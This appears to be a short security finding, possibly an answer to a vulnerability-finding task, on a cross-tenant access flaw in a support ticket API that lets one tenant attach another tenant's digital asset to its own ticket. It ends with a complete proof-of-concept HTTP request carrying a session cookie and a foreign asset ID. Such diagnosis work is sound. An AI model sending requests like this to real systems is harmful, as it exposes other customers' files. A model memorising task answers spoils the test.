diagnosis: While the ticket lookup correctly enforces tenant=request.tenant, the DigitalAsset lookup does not check tenant scoping. An attacker can supply asset_id belonging to another tenant and attach it to their ticket, exposing foreign tenant files.
exploit_request:
POST /api/tickets/902/attach-asset/ HTTP/1.1
Host: support.example.com
Cookie: sessionid=tenant_b_session
Content-Type: application/x-www-form-urlencoded

asset_id=10542
